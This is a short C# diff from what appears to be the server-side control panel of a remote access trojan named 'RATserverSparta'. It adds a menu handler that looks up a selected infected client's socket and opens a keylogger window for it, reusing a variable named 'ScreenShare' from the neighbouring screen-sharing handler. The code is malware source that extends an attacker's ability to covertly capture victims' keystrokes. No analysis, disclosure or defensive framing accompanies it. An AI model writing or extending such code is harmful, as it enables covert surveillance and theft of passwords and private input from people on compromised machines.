@@ -174,5 +174,18 @@ namespace RATserverSparta
                 ScreenShare.Show();
             }
         }
+
+        private void toolStripMenuItem3_Click(object sender, EventArgs e)
+        {
+            if (SendDataAfterChecks(25))
+            {
+                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
+                Client.Client Client = this.SocketAcceptClassInstance.ClientInstanceMap[SelectedClientString];
+                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
+
+                RATserverSparta.Tools.KeyLogger ScreenShare = new RATserverSparta.Tools.KeyLogger(Client, SelectedClientSocket);
+                ScreenShare.Show();
+            }
+        }
     }
 }
